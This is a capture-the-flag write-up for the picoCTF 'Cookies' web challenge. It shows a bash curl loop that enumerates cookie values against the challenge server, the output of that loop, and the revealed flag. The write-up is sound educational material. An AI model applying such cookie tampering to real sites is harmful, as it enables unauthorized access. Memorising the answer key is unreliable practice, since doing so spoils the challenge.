# Cookies

## Overview

* Points: 40
* Category: Web Exploitation
* Author: Madstacks

## Description
> Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:54219/

## Hints

1. None!

## Approach

1. The webpage contains a form with a placeholder value. If we input "snickerdoodle" (as suggested by the placeholder value) we get a page containing the following message: "That is a cookie! Not very special though...". If we try to input a different value, the message will say: "That doesn't appear to be a valid cookie."
2. In the DevTools we can see a cookie called "name" with a set value of -1, which will be sent to the server when we use the form. As the description suggests, we have to find the best value to sent to the server!
3. To achieve this, we can write a quick [bash script](cookie_baker.sh) using the cURL tool to send a homemade cookie (nice joke, am I right?)
```bash
for i in {1..30}; do
        echo "Testing with \"Cookie: name=$i\""
        contents=$(curl -s http://mercury.picoctf.net:54219/ -H "Cookie: name=$i; Path=/" -L)
        echo $contents | grep "pico"
done
```
4. As we can see by the following output given by the script, 18 was the correct value:
```bash
Testing with "Cookie: name=1"
Testing with "Cookie: name=2"
Testing with "Cookie: name=3"
Testing with "Cookie: name=4"
Testing with "Cookie: name=5"
Testing with "Cookie: name=6"
Testing with "Cookie: name=7"
Testing with "Cookie: name=8"
Testing with "Cookie: name=9"
Testing with "Cookie: name=10"
Testing with "Cookie: name=11"
Testing with "Cookie: name=12"
Testing with "Cookie: name=13"
Testing with "Cookie: name=14"
Testing with "Cookie: name=15"
Testing with "Cookie: name=16"
Testing with "Cookie: name=17"
Testing with "Cookie: name=18"
<!DOCTYPE html> <html lang="en"> <head> <title>Cookies</title> <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet"> <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet"> <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script> <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script> </head> <body> <div class="container"> <div class="header"> <nav> <ul class="nav nav-pills pull-right"> <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a> </li> </ul> </nav> <h3 class="text-muted">Cookies</h3> </div> <div class="jumbotron"> <p class="lead"></p> <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}</code></p> </div> <footer class="footer"> <p>&copy; PicoCTF</p> </footer> </div> </body> </html>
#the flag is near the end of this HTML code
Testing with "Cookie: name=19"
Testing with "Cookie: name=20"
Testing with "Cookie: name=21"
...
```

## Flag

<details>
<summary>Click to view the flag</summary>

__picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}__
</details>